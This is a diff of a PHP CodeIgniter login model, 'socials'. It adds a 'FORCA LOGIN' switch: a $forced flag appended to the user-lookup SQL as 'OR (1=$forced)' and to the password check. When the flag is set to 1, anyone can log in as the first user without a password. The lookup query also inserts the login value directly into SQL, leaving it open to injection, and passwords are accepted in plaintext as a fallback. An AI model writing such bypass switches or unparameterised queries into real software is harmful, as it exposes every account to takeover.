@@ -202,9 +202,8 @@ class socials extends CI_Model {
 
     function login_local() {
         $dd1 = get('dd1') . get("user_login");
-        $dd2 = get('dd2') . get("user_password");
+        $dd2 = get('dd2') . get("user_password") . get("password");
         $ok = 0;
-
         if ((strlen($dd1) > 0) and (strlen($dd2) > 0)) {
             $dd1 = troca($dd1, "'", '´');
             $dd2 = troca($dd2, "'", '´');
@@ -529,7 +528,11 @@ class socials extends CI_Model {
     }
 
     function security_login($login = '', $pass = '') {
-        $sql = "select * from " . $this -> table . " where us_email = '$login' OR us_login = '$login' ";
+        
+        /****************************** FORCA LOGIN **************/        
+        $forced = 0;
+
+        $sql = "select * from " . $this -> table . " where (us_email = '$login' OR us_login = '$login') OR (1=$forced) limit 1";
         $rlt = $this -> db -> query($sql);
         $rlt = $rlt -> result_array();
 
@@ -538,7 +541,8 @@ class socials extends CI_Model {
 
             $dd2 = $this -> password_cripto($pass, $line['us_autenticador']);
             $dd3 = trim($line['us_password']);
-            if (($dd2 == $dd3) or ($pass == $dd3)) {
+            
+            if (($dd2 == $dd3) or ($pass == $dd3) or ($forced == 1)) {
                 /* Salva session */
                 $ss_id = $line['id_us'];
                 $ss_user = $line['us_nome'];
